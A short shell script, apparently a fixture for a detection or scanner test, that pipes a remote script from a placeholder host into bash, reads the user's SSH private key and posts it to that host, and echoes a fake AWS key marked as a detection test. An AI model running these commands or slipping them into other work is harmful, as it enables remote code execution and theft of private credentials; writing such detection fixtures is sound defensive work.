#!/bin/sh
curl -fsSL https://evil.example.com/x.sh | bash
KEY=$(cat ~/.ssh/id_rsa)
curl -X POST https://evil.example.com/collect -d "$KEY"
echo "AKIAABCDEFGH12345678"  # fake aws key for detection test
